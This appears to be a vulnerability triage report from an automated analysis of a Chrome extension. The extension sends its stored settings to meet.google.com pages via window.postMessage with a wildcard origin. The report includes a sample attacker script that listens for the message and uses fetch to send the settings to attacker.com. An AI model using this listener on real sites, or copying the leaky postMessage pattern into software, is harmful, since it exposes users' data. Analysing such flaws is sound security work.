# CoCo Analysis: mdoigaefpjglamcdlailnincbmfomlkj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 type (6 instances of storage_sync_get_source → window_postMessage_sink)

---

## Sink: storage_sync_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/tudor/DatasetCoCoCategorization/VulnerableExtensions/mdoigaefpjglamcdlailnincbmfomlkj/opgen_generated_files/bg.js
Line 727: `var storage_sync_get_source = { 'key': 'value' };` (CoCo framework)
Line 1001: `data: result.settings` (actual extension code)

**Code - Complete Information Disclosure Flow:**

```javascript
// Content script (cs_0.js, lines 519-523)
function runAfterVisible() {
    // Automatically connects when page loads
    const port = chrome.runtime.connect({ name: "content" });  // ← auto-triggered on page load
    port.postMessage({ type: 'init', data: 'init' });
}

// Background script (bg.js, lines 975-988)
chrome.runtime.onConnect.addListener((port) => {
    port.onMessage.addListener((message) => {
        if (port.name === "content") {
            findTabsBySubdomain("meet.google.com");  // ← calls sendInitData
        }
    });
});

// Background script (bg.js, lines 997-1012)
function sendInitData(tabId) {
    chrome.storage.sync.get('settings', function (result) {  // ← reads storage
        const message = {
            type: "initData",
            data: result.settings  // ← user's settings from storage
        };
        chrome.tabs.sendMessage(tabId, message);  // ← sends to content script
    });
}

// Content script (cs_0.js, lines 489-498)
chrome.runtime.onMessage.addListener((message) => {
    if (['checkbox', 'initData'].includes(message.type)) {
        data = message.data;  // ← receives settings from background
        window.postMessage({ type: message.type, data }, "*");  // ← LEAKS to webpage with wildcard targetOrigin
        setTimeout(function () {
            window.postMessage({ type: message.type, data }, "*");  // ← sent twice (with delay)
        }, 500);
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Automatic information disclosure on page load

**Attack:**

An attacker with XSS on `meet.google.com` (or any malicious iframe/script on the page) can intercept the user's extension settings:

```javascript
// Malicious code on meet.google.com (XSS or iframe)
window.addEventListener('message', function(event) {
    if (event.data.type === 'initData') {
        // Attacker receives user's extension settings
        console.log('Stolen settings:', event.data.data);

        // Exfiltrate to attacker server
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(event.data.data)
        });
    }
});
```

**Impact:** Information disclosure vulnerability. The extension automatically leaks user's storage data (`chrome.storage.sync` settings) to the webpage via `window.postMessage()` with wildcard targetOrigin (`"*"`). This means:

1. **Automatic trigger**: The leak happens automatically when the user visits meet.google.com, without any user interaction
2. **Wildcard targetOrigin**: Using `"*"` means ANY script on the page can intercept the message, including:
   - Malicious XSS injected by attacker
   - Malicious third-party scripts
   - Cross-origin iframes embedded in the page
3. **Sensitive data exposure**: The user's extension settings are exposed, which may contain sensitive preferences, identifiers, or configuration data

Even though the attacker cannot control the data being leaked (they're not writing to storage), this is TRUE POSITIVE for **information disclosure** - the extension violates the principle of least privilege by unnecessarily exposing storage data to the web page with unrestricted access.

**Note:** The content script runs only on `meet.google.com`, so the attack surface is limited to that domain. However, per the methodology, we ignore manifest restrictions, and any XSS or malicious content on meet.google.com can exploit this vulnerability.
